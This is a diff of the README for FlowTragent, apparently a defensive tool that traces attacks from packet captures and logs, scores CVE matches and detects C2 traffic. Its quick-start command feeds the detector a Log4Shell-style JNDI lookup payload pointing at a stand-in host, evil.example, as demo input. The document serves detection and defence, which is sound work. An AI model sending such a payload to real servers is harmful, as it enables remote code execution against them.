@@ -1,8 +1,12 @@
 # FlowTragent
 
-FlowTragent is an automated attack tracing system built around traffic analysis and agent-assisted reasoning.
+FlowTragent is an automated attack tracing system built around traffic analysis,
+multi-source evidence correlation, and agent-assisted reasoning.
 
-The project wraps NOVA-F as its core retrieval engine while keeping FlowTragent as an independent system with PCAP parsing, agent analysis, optional RAG context, optional Ollama summaries, and report generation.
+It wraps NOVA-F as the retrieval engine while keeping FlowTragent as an
+independent system for PCAP parsing, payload/log ingestion, attack-chain
+analysis, C2 detection, optional RAG context, scheduled Ollama review, live
+alerting, and report generation.
 
 ## Architecture
 
@@ -12,7 +16,7 @@ flowchart LR
     LIVE[Live capture worker] --> PREF[Live prefilter]
     PREF --> ANALYZER[Live analyzer worker]
     ANALYZER --> ORCH
-    ORCH --> PARSER[PCAP / payload parser]
+    ORCH --> PARSER[PCAP / payload / log parsers]
     ORCH --> NOVA[NOVA-F retrieval]
     ORCH --> CORR[Attack chain + C2 correlation]
     ORCH --> AGENT[Trace agent]
@@ -24,52 +28,60 @@ flowchart LR
     ALERTS --> WEB
 ```
 
-FlowTragent keeps the real-time hot path lightweight: capture and prefilter run continuously, deep analysis is rate-limited, duplicate alerts are merged, and Ollama review is scheduled outside the live analyzer.
+The live path is intentionally lightweight: capture and prefilter run
+continuously, deep analysis is rate-limited, duplicate alerts are merged,
+notifications are suppressed by fingerprint windows, and Ollama review is kept
+out of the hot path.
 
-## Current Layout
+## Key Features
+
+- Payload, PCAP, access log, DNS log, endpoint log, application log, Zeek log,
+  and Suricata EVE ingestion.
+- Attack-chain staging with evidence IDs and confidence reasoning.
+- HTTP/DNS/TCP/ICMP C2 and anomaly detection.
+- NOVA-F CVE retrieval with rule-aware reranking and low-similarity
+  suppression.
+- Evidence graph output in Mermaid, DOT, and SVG-rendered views.
+- Web UI with token protection, upload validation, report browsing, alert
+  views, and graph visualization.
+- Live capture/analyzer workers with alert deduplication, cross-window activity
+  correlation, rate limiting, and scheduled Ollama review.
+- Prometheus `/metrics`, structured JSON Lines audit logs, Webhook
+  notifications, and notification suppression.
+- Dockerfile, Docker Compose, systemd units, and unified deployment guidance.
+
+## Repository Layout
 
 ```text
 FlowTragent/
-|-- libs/nova-f/
+|-- config/
 |-- deploy/
+|-- user_docs/
+|-- libs/nova-f/
 |-- scripts/
 |-- src/
-|   |-- core/
 |   |-- agent/
+|   |-- core/
 |   |-- correlation/
 |   |-- live/
 |   |-- notification/
 |   |-- orchestrator/
 |   |-- parser/
 |   |-- rag/
-|   |-- report/
-|   `-- storage/
+|   `-- report/
 |-- static/
 |-- templates/
-|-- data/
-|   |-- pcap/
-|   |-- csv/
-|   |-- index/
-|   `-- rag/
-|-- config/
-|-- reports/
 |-- tests/
-|-- requirements.txt
-|-- web_app.py
-`-- main.py
+|-- Dockerfile
+|-- docker-compose.yml
+|-- LICENSE
+|-- CHANGELOG.md
+|-- CONTRIBUTING.md
+|-- README.md
+`-- README_EN.md
 ```
 
-## Quick Demo
-
-For the unified deployment guide, see [docs/FlowTragent_部署指南.md](docs/FlowTragent_部署指南.md). For WSL Ubuntu notes, see [docs/WSL_Quickstart_CN.md](docs/WSL_Quickstart_CN.md).
-
-One-click local installation on Linux/WSL:
-
-```bash
-bash scripts/install.sh
-```
-
-The installer creates `.venv`, builds the demo index, generates a local `.env` token when needed, and starts the Web UI. Use `bash scripts/install.sh --docker` for Docker Compose, or `bash scripts/install.sh --no-start` to prepare the environment without starting services.
+## Quick Start
 
 ```bash
 cd ~/projects/FlowTragent
@@ -77,11 +89,12 @@ python3 -m venv flowtragent_env
 source flowtragent_env/bin/activate
 python -m pip install --upgrade pip setuptools wheel
 python -m pip install -r requirements.txt
-python tests/test_nova.py
 python main.py --mode payload --input 'GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1 Host: victim' --demo-index
 ```
 
-Expected result: a JSON/Markdown report is written under `reports/` with impact assessment, CVE candidates, evidence observed/not observed, confidence drivers/reducers, and attack-chain context.
+Expected result: a JSON and Markdown report is written under `reports/` with
+impact assessment, CVE candidates, observed/missing evidence, confidence
+drivers/reducers, and attack-chain context.
 
 The default embedding model path is local:
 
@@ -89,7 +102,7 @@ The default embedding model path is local:
 libs/nova-f/models/all-MiniLM-L6-v2
 ```
 
-This avoids HuggingFace downloads when the NOVA-F model files are present locally.
+This avoids HuggingFace downloads when the NOVA-F model files are present.
 
 ## PCAP Demo
 
@@ -99,8 +112,6 @@ python tests/make_demo_pcap.py
 python main.py --mode pcap --input data/pcap/demo_attack.pcap --demo-index
 ls -lh reports/
 ```
-
-The demo PCAP contains both a Log4Shell-style HTTP request and a `200 OK` response, so reports include response status and impact assessment evidence.
 
 Additional demo traffic:
 
@@ -112,7 +123,25 @@ python tests/make_http_beacon_pcap.py
 python main.py --mode pcap --input data/pcap/demo_http_beacon.pcap --enable-rag
 ```
 
-## Web UI and Health Check
+## Supplementary Logs
+
+PCAP analysis can be enriched with structured logs:
+
+```bash
+python main.py --mode pcap --input data/pcap/demo_attack.pcap \
+  --access-log access.log \
+  --dns-log dns.jsonl \
+  --endpoint-log endpoint.csv \
+  --app-log app.jsonl \
+  --zeek-log http.log \
+  --suricata-log eve.jsonl
+```
+
+Endpoint and application evidence can raise confidence for post-exploitation
+behavior, but ordinary host-side noise does not bypass HTTP 4xx downgrade
+logic.
+
+## Web UI
 
 Development mode:
 
@@ -128,19 +157,11 @@ curl http://127.0.0.1:5000/health
 curl http://127.0.0.1:5000/metrics
 ```
 
-Open http://127.0.0.1:5000 and submit a payload or PCAP file. Set `FLOWTRAGENT_TOKEN` to protect upload, delete, download, export, graph, and alert views.
+Open <http://127.0.0.1:5000> and submit a payload or PCAP file. Set
+`FLOWTRAGENT_TOKEN` to protect upload, delete, download, export, graph, and
+alert views.
 
-## Optional RAG and Ollama
-
-```bash
-# Add local ChromaDB seed context to the report.
-python main.py --mode pcap --input data/pcap/demo_attack.pcap --demo-index --enable-rag
-
-# Ask local Ollama for an agent summary when ollama serve is running.
-python main.py --mode pcap --input data/pcap/demo_attack.pcap --demo-index --enable-rag --enable-ollama
-```
-
-## Live Capture Flow
+## Live Capture
 
 ```bash
 sudo apt update
@@ -164,76 +185,94 @@ sudo systemctl enable --now flowtragent-web flowtragent-capture flowtragent-anal
 curl http://127.0.0.1:5000/health
 ```
 
-Docker Compose one-command startup:
+## Docker / Compose
+
+Docker Compose entrypoints are available:
 
 ```bash
 docker compose up --build
 ```
 
-This starts the Web UI, live analyzer worker, and live capture worker. If the host cannot grant capture permissions to the container, start the Web and analyzer services first:
+This starts the Web UI, live analyzer worker, and live capture worker. If the
+host cannot grant capture permissions to the container, start Web and analyzer
+first:
 
 ```bash
 docker compose up --build web analyzer
 ```
 
-## Ollama
+Current caveat: Dockerfile and Compose configuration are present, and static
+Compose configuration has been validated, but real `docker compose up --build`
+still needs verification on a machine where Docker daemon is running.
 
-```bash
-curl -fsSL https://ollama.com/install.sh | sh
-ollama pull phi3:mini
-OLLAMA_HOST=0.0.0.0:11434 ollama serve
-curl http://127.0.0.1:11434/api/generate \
-  -d '{"model":"phi3:mini","prompt":"Summarize Log4Shell in one sentence.","stream":false}'
-```
+## Observability
 
-## Evaluation and Release Status
+- `/health`: component and path health.
+- `/metrics`: Prometheus text format metrics.
+- `logs/flowtragent.jsonl`: structured JSON Lines audit log by default.
+- Webhook notifications: disabled by default, configurable under
+  `notification.webhook`.
+- Notification suppression: defaults to a 300-second fingerprint window.
 
-- Phase 1, confidence correction: completed. All-4xx traffic is downgraded to attempt-level conclusions unless host-side evidence supports success; reports include fixed evidence and confidence sections.
-- Phase 2, architecture split: completed. CLI, Web UI, orchestrator, templates, static assets, and detection thresholds are separated.
-- Phase 3, serverization: completed. Token protection, upload validation, gunicorn startup, `/health`, and systemd units are available.
-- Phase 4, performance and batch processing: completed. NOVA-F batch search, alert deduplication, cross-window merge, live rate limiting, and scheduled Ollama review are implemented.
-- Phase 5, evaluation and release: completed. DataCon baseline metrics, three-class evaluation fixtures, deployment documentation, Dockerfile, and Compose entrypoints are available.
-- Phase 6, retrieval evaluation loop: completed as an engineering baseline. Full DataCon scale still depends on a dataset with at least 10,000 usable samples.
-- Phase 7, detection expansion: completed. Zeek/Suricata logs, DNS/TCP/ICMP expansion, endpoint/application correlation, and cross-window activity views are available.
-- Phase 8, observability: completed. `/metrics`, JSON Lines audit logs, Webhook notification, notification suppression, and log retention guidance are available.
-- Phase 9, open-source readiness: completed. Governance files, English README, API docs, architecture docs, GitHub templates, Dockerfile, and Docker Compose startup have been validated; local port `5000` may be replaced with `5050` when occupied.
+See [user_docs/FlowTragent_部署指南.md](user_docs/FlowTragent_部署指南.md) for deployment,
+log rotation, and retention guidance.
 
-Current DataCon demo-index baseline is documented in [docs/FlowTragent_DataCon检索评估报告.md](docs/FlowTragent_DataCon检索评估报告.md). With the demo index, the sample evaluation recorded 132 samples, Top-1 accuracy `0.0000`, Top-5 recall `0.0076`, and macro CVE Top-5 recall `0.0102`; this is a baseline for tooling validation, not a full-index quality claim.
+## Evaluation Status
 
-## Project Documents
+The DataCon evaluation loop is now reproducible:
 
-- [English README](README_EN.md)
-- [Deployment Guide](docs/FlowTragent_部署指南.md)
-- [API Reference](docs/API.md)
-- [Architecture](docs/ARCHITECTURE.md)
-- [DataCon Retrieval Evaluation Report](docs/FlowTragent_DataCon检索评估报告.md)
-- [Contributing Guide](CONTRIBUTING.md)
-- [Changelog](CHANGELOG.md)
-- [License](LICENSE)
+- index build scripts record manifest metadata and excluded holdout IDs;
+- holdout samples do not participate in index construction;
+- evaluation reports include Top-1, Top-5, macro CVE Top-5, quality gates, and
+  root-cause summaries;
+- low-similarity candidates are suppressed instead of being forced into CVE
+  conclusions.
+
+Current caveat: the local `datacon_train_labeled.csv` source is below the
+planned >=10,000 sample scale, so the current result is an engineering baseline,
+not a final full-dataset benchmark.
 
 ## Verification
 
 ```bash
 pytest tests/
 python tests/test_web_app.py
+python tests/test_agent_orchestrator.py
+python tests/test_langgraph_runner.py
 ```
 
-Scapy-dependent PCAP tests should run in a Linux/WSL environment with the project dependencies installed.
-
-## Common Fixes
+When scapy is available in Linux/WSL, also run:
 
 ```bash
-# Missing venv support
-sudo apt update
-sudo apt install -y python3-venv python3-pip
-
-# PCAP capture permission
-sudo setcap cap_net_raw,cap_net_admin=eip "$(command -v tcpdump)"
-
-# pip temporary directory has no space
-mkdir -p ~/pip-tmp ~/pip-cache
-TMPDIR=~/pip-tmp PIP_CACHE_DIR=~/pip-cache python -m pip install -r requirements.txt
-
-# WSL cannot reach Ollama from Windows or another WSL distro
-OLLAMA_HOST=0.0.0.0:11434 ollama serve
+python tests/test_pipeline.py
+python tests/test_live_prefilter.py
+python tests/test_live_analyzer_worker.py
 ```
+
+## Runtime Artifacts
+
+Do not commit runtime or sensitive artifacts:
+
+- `logs/`
+- `reports/`
+- `data/live/`
+- `data/tmp/`
+- `data/index/`
+- real PCAP files
+- raw DataCon datasets
+- model weights or private embeddings
+
+## Project Documents
+
+- [Deployment Guide](user_docs/FlowTragent_部署指南.md)
+- [Chinese README](README_CN.md)
+- [Chinese API Reference](user_docs/API_CN.md)
+- [Chinese Architecture](user_docs/ARCHITECTURE_CN.md)
+- [DataCon Retrieval Evaluation Report](user_docs/FlowTragent_DataCon检索评估报告.md)
+- [Contributing Guide](CONTRIBUTING.md)
+- [Changelog](CHANGELOG.md)
+- [License](LICENSE)
+
+## License
+
+FlowTragent is released under the MIT License. See [LICENSE](LICENSE).
